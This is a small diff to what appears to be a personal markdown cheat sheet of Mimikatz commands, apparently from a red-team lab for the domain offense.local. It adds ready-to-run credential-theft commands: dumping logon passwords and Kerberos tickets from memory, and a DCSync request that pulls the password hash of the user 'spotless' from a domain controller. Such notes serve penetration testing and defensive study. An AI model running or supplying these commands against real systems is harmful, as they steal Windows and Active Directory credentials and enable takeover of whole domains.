@@ -5,6 +5,17 @@
 
 ## not sure where this pulls from
 ```
-sekurlsa::logonpasswords
+mimikatz # sekurlsa::logonpasswords
+```
+
+## What tickets are present
+```
+mimikatz # sekurlsa::tickets
+```
+
+## LSADump
+Fetch a hash from DC for spotless
+```
+mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
 ```
 
